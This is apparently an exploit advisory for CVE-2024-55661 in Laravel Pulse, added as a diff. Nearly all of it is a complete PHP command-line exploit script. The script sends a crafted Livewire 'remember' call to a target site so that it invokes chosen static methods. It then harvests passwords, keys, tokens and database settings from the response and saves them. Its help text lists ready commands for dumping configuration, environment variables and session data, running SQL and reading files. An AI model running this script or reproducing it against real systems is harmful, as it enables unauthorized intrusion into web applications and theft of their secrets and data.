@@ -1,0 +1,315 @@
+=============================================================================================================================================
+| # Title     : Laravel Pulse 1.3.1 Arbitrary Code Injection                                                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://pulse.laravel.com/                                                                                                  |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/200719/ & 	CVE-2024-55661 
+
+[+] Summary : 
+            The vulnerability exists in the RemembersQueries trait within Laravel Pulse, specifically in the remember() method which improperly handles user-controlled callable parameters.
+			
+			
+[+]  POC : 
+#!/usr/bin/env php
+<?php
+/**
+ * Laravel Pulse < 1.3.1 - Arbitrary Code Injection Exploit (CVE-2024-55661)
+ * Author: Mohammed Idrees Banyamer (@banyamer_security)
+ * PHP CLI Version - indoushka
+ */
+
+if (php_sapi_name() !== 'cli') {
+    die("❌ This script must be run from command line only\n");
+}
+
+class LaravelPulseExploit {
+    private $url;
+    private $component;
+    private $method;
+    private $csrf;
+    private $key;
+    private $component_id;
+
+    public function __construct($url, $component, $method, $csrf = null, $key = 'exploit', $component_id = 'abcde') {
+        $this->url = rtrim($url, '/');
+        $this->component = $component;
+        $this->method = $method;
+        $this->csrf = $csrf;
+        $this->key = $key;
+        $this->component_id = $component_id;
+    }
+
+    private function buildPayload() {
+        return [
+            "type" => "callMethod",
+            "method" => "remember",
+            "params" => [$this->method, $this->key],
+            "id" => $this->component_id,
+            "name" => $this->component
+        ];
+    }
+
+    public function send() {
+        $full_url = $this->url . '/livewire/message/' . $this->component;
+        $payload = $this->buildPayload();
+        
+        $this->showBanner();
+        
+        echo "🔍 [INFO] Attack Details:\n";
+        echo "──────────────────────────────────────────────────\n";
+        echo "🎯 Target:          " . $this->url . "\n";
+        echo "⚙️  Component:       " . $this->component . "\n";
+        echo "🛠️  Method:          " . $this->method . "\n";
+        echo "🔑 Key:             " . $this->key . "\n";
+        echo "🆔 Component ID:    " . $this->component_id . "\n";
+        echo "──────────────────────────────────────────────────\n\n";
+
+        echo "🚀 [*] Sending exploit to: " . $full_url . "\n";
+
+        $headers = [
+            "Content-Type: application/json",
+            "X-Livewire: true",
+            "Accept: application/json"
+        ];
+
+        if ($this->csrf) {
+            $headers[] = "X-CSRF-TOKEN: " . $this->csrf;
+        }
+
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $full_url,
+            CURLOPT_POST => true,
+            CURLOPT_HTTPHEADER => $headers,
+            CURLOPT_POSTFIELDS => json_encode($payload),
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]);
+
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+
+        if ($error) {
+            echo "❌ [-] Request failed: " . $error . "\n";
+            exit(1);
+        }
+
+        $this->displayResponse($http_code, $response);
+    }
+
+    private function displayResponse($http_code, $response) {
+        echo "\n📊 [RESULTS] Exploitation Results:\n";
+        echo "──────────────────────────────────────────────────\n";
+        echo "📡 Status Code: " . $this->colorizeHttpCode($http_code) . "\n";
+        
+        if ($http_code == 200) {
+            $data = json_decode($response, true);
+            if (json_last_error() === JSON_ERROR_NONE) {
+                echo "✅ JSON decoded successfully\n";
+                echo "──────────────────────────────────────────────────\n";
+                
+                // Display formatted data
+                $this->displayFormattedData($data);
+                
+                // Search for sensitive data
+                $this->extractSensitiveData($data);
+                
+                // Save results to file
+                $this->saveResults($data);
+            } else {
+                echo "❌ Failed to decode JSON\n";
+                echo "📄 Raw content:\n" . $response . "\n";
+            }
+        } else {
+            echo "❌ Unexpected server response\n";
+            echo "📄 Content:\n" . $response . "\n";
+        }
+    }
+
+    private function displayFormattedData($data) {
+        if (isset($data['effects']['html'])) {
+            echo "📝 Retrieved HTML:\n";
+            echo substr($data['effects']['html'], 0, 500) . "...\n";
+        }
+        
+        if (isset($data['data'])) {
+            echo "💾 Retrieved Data:\n";
+            foreach ($data['data'] as $key => $value) {
+                if (is_string($value) && strlen($value) > 100) {
+                    echo "  📁 {$key}: " . substr($value, 0, 100) . "...\n";
+                } else {
+                    echo "  📁 {$key}: " . json_encode($value) . "\n";
+                }
+            }
+        }
+    }
+
+    private function extractSensitiveData($data) {
+        echo "\n🔍 [SENSITIVE DATA] Searching for sensitive information:\n";
+        echo "──────────────────────────────────────────────────\n";
+        
+        $sensitive_patterns = [
+            'password' => '/password|pwd|pass/i',
+            'key' => '/key|secret|token|api_key/i',
+            'database' => '/db_|database|mysql|pgsql/i',
+            'config' => '/config|setting|env/i'
+        ];
+
+        $found_data = [];
+
+        array_walk_recursive($data, function($value, $key) use (&$found_data, $sensitive_patterns) {
+            if (is_string($key)) {
+                foreach ($sensitive_patterns as $type => $pattern) {
+                    if (preg_match($pattern, $key) && !empty($value)) {
+                        $found_data[$type][] = [
+                            'key' => $key,
+                            'value' => substr(strval($value), 0, 200)
+                        ];
+                    }
+                }
+            }
+        });
+
+        foreach ($found_data as $type => $items) {
+            echo "⚠️  " . strtoupper($type) . ":\n";
+            foreach ($items as $item) {
+                echo "   • {$item['key']}: {$item['value']}\n";
+            }
+            echo "\n";
+        }
+
+        if (empty($found_data)) {
+            echo "✅ No obvious sensitive data found\n";
+        }
+    }
+
+    private function saveResults($data) {
+        $filename = 'laravel_pulse_results_' . date('Y-m-d_His') . '.json';
+        file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+        echo "💾 [SAVED] Results saved to: {$filename}\n";
+    }
+
+    private function colorizeHttpCode($code) {
+        if ($code >= 200 && $code < 300) {
+            return "✅ {$code}";
+        } elseif ($code >= 400 && $code < 500) {
+            return "⚠️  {$code}";
+        } elseif ($code >= 500) {
+            return "❌ {$code}";
+        } else {
+            return "🔵 {$code}";
+        }
+    }
+
+    private function showBanner() {
+        echo "
+┌─────────────────────────────────────────────────────────────┐
+│                    LARAVEL PULSE EXPLOIT                    │
+│                  CVE-2024-55661 - PHP CLI                   │
+│                Author: indoushka                            │
+└─────────────────────────────────────────────────────────────┘\n\n";
+    }
+}
+
+function showHelp() {
+    echo "
+📖 USAGE:
+──────────────────────────────────────────────────
+
+🛠️  Basic Usage:
+  php laravel_exploit.php -u URL -c COMPONENT -m METHOD
+
+📋 Required Options:
+  -u, --url        Laravel application URL (e.g., http://example.com)
+  -c, --component  Livewire component name (e.g., pulse.livewire.config-component)
+  -m, --method     Static method to call
+
+📌 Additional Options:
+  -k, --key        Cache key (default: exploit)
+  --csrf           Optional CSRF token
+  --id             Component ID (default: abcde)
+  -h, --help       Show this help
+
+🎯 Practical Examples:
+  php laravel_exploit.php -u http://localhost -c pulse.livewire.config-component -m '\\\Illuminate\\\Support\\\Facades\\\Config::all'
+  
+  php laravel_exploit.php -u https://target.com -c pulse.livewire.config-component -m '\\\Illuminate\\\Support\\\Facades\\\DB::select' -k db_test
+  
+  php laravel_exploit.php -u http://app.test -c pulse.livewire.config-component -m '\\\Illuminate\\\Support\\\Facades\\\File::get' --csrf token123
+
+🔧 Common Exploitation Methods:
+  • \\Illuminate\\Support\\Facades\\Config::all    - Get all configuration
+  • \\Illuminate\\Support\\Facades\\DB::select     - Execute SQL queries
+  • \\Illuminate\\Support\\Facades\\File::get      - Read files
+  • \\Illuminate\\Support\\Facades\\Env::get       - Get environment variables
+  • \\Illuminate\\Support\\Facades\\Session::all   - Get session data
+
+⚠️  Note: For ethical use in authorized penetration testing only
+\n";
+}
+
+function parseArguments() {
+    $options = getopt("u:c:m:k:h", ["url:", "component:", "method:", "key:", "csrf:", "id:", "help"]);
+    
+    if (isset($options['h']) || isset($options['help'])) {
+        showHelp();
+        exit(0);
+    }
+    
+    $missing = [];
+    if (!isset($options['u']) && !isset($options['url'])) $missing[] = "URL (-u)";
+    if (!isset($options['c']) && !isset($options['component'])) $missing[] = "Component (-c)";
+    if (!isset($options['m']) && !isset($options['method'])) $missing[] = "Method (-m)";
+    
+    if (!empty($missing)) {
+        echo "❌ Missing required parameters:\n";
+        foreach ($missing as $error) {
+            echo "   • {$error} is required\n";
+        }
+        echo "\n";
+        showHelp();
+        exit(1);
+    }
+    
+    return [
+        'url' => $options['u'] ?? $options['url'] ?? null,
+        'component' => $options['c'] ?? $options['component'] ?? null,
+        'method' => $options['m'] ?? $options['method'] ?? null,
+        'key' => $options['k'] ?? $options['key'] ?? 'exploit',
+        'csrf' => $options['csrf'] ?? null,
+        'id' => $options['id'] ?? 'abcde'
+    ];
+}
+
+// Main execution
+try {
+    $args = parseArguments();
+    
+    $exploit = new LaravelPulseExploit(
+        $args['url'],
+        $args['component'], 
+        $args['method'],
+        $args['csrf'],
+        $args['key'],
+        $args['id']
+    );
+    
+    $exploit->send();
+    
+} catch (Exception $e) {
+    echo "❌ Error: " . $e->getMessage() . "\n";
+    exit(1);
+}
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
